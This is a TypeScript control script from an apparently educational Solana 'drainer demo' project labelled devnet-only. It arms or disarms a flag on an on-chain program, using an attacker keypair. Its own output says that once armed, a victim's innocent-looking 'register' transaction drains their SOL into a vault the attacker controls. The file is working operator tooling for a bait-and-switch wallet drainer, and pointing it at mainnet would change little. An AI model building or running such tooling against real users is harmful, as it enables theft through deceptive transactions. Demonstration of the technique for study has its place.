/**
 * EDUCATIONAL DEMO - DEVNET ONLY
 *
 * Flips the drain flag on or off.
 *
 * Usage:
 *   npx ts-node scripts/flip.ts on     # Enable drain
 *   npx ts-node scripts/flip.ts off    # Disable drain
 *   npx ts-node scripts/flip.ts status # Check current state
 */

import * as anchor from '@coral-xyz/anchor';
import { Program, AnchorProvider, Wallet } from '@coral-xyz/anchor';
import { Connection, Keypair, PublicKey } from '@solana/web3.js';
import * as fs from 'fs';
import * as path from 'path';

const DEVNET_RPC = 'https://api.devnet.solana.com';

async function main() {
    const action = process.argv[2]?.toLowerCase();
    if (!['on', 'off', 'status'].includes(action)) {
        console.log('Usage: npx ts-node scripts/flip.ts <on|off|status>');
        process.exit(1);
    }

    const idlPath = path.resolve(__dirname, '..', 'target', 'idl', 'drainer_demo.json');
    if (!fs.existsSync(idlPath)) {
        console.error('IDL not found. Run `anchor build` first.');
        process.exit(1);
    }
    const idl = JSON.parse(fs.readFileSync(idlPath, 'utf8'));

    const programKeypairPath = path.resolve(__dirname, '..', 'target', 'deploy', 'drainer_demo-keypair.json');
    const programKeypairData = JSON.parse(fs.readFileSync(programKeypairPath, 'utf8'));
    const programKeypair = Keypair.fromSecretKey(Uint8Array.from(programKeypairData));
    const programId = programKeypair.publicKey;

    const homeDir = process.env.HOME || process.env.USERPROFILE || '';
    const candidates = [
        path.resolve(__dirname, '..', 'attacker-keypair.json'),
        path.join(homeDir, '.config', 'solana', 'id.json'),
    ];

    const walletKeypairPath = candidates.find(p => fs.existsSync(p));
    if (!walletKeypairPath) {
        console.error('No wallet keypair found. Run initialize.ts first.');
        process.exit(1);
    }

    const walletKeypairData = JSON.parse(fs.readFileSync(walletKeypairPath, 'utf8'));
    const walletKeypair = Keypair.fromSecretKey(Uint8Array.from(walletKeypairData));

    const connection = new Connection(DEVNET_RPC, 'confirmed');
    const wallet = new Wallet(walletKeypair);
    const provider = new AnchorProvider(connection, wallet, { commitment: 'confirmed' });
    anchor.setProvider(provider);

    idl.address = programId.toBase58();
    const program = new Program(idl, provider);

    const [configPda] = PublicKey.findProgramAddressSync(
        [Buffer.from('config')],
        programId
    );
    const [vaultPda] = PublicKey.findProgramAddressSync(
        [Buffer.from('vault')],
        programId
    );

    if (action === 'status') {
        try {
            const config = await (program.account as any).config.fetch(configPda);
            const vaultBalance = await connection.getBalance(vaultPda);
            const authorityBalance = await connection.getBalance(config.authority as PublicKey);
            console.log('--- Config Status ---');
            console.log(`  Authority:        ${(config.authority as PublicKey).toBase58()}`);
            console.log(`  Drain Active:     ${config.drainActive}`);
            console.log(`  Vault PDA:        ${vaultPda.toBase58()}`);
            console.log(`  Vault Balance:    ${(vaultBalance / 1e9).toFixed(4)} SOL`);
            console.log(`  Authority Balance: ${(authorityBalance / 1e9).toFixed(4)} SOL`);
        } catch (err) {
            console.error('Config not initialized. Run initialize.ts first.');
        }
        return;
    }

    const active = action === 'on';
    console.log(`Flipping drain to: ${active ? 'ON (ARMED)' : 'OFF (SAFE)'}`);

    const tx = await program.methods
        .flip(active)
        .accounts({
            config: configPda,
            authority: walletKeypair.publicKey,
        })
        .signers([walletKeypair])
        .rpc();

    console.log(`Flip tx: ${tx}`);
    console.log(`Explorer: https://explorer.solana.com/tx/${tx}?cluster=devnet`);

    if (active) {
        console.log('\n=== DRAIN IS NOW ARMED ===');
        console.log('Any "register" transaction will now drain the victim\'s SOL to the vault PDA.');
    } else {
        console.log('\n=== DRAIN IS NOW DISARMED ===');
        console.log('"register" transactions will do nothing (safe/benign).');
    }
}

main().catch(err => {
    console.error('Error:', err);
    process.exit(1);
});
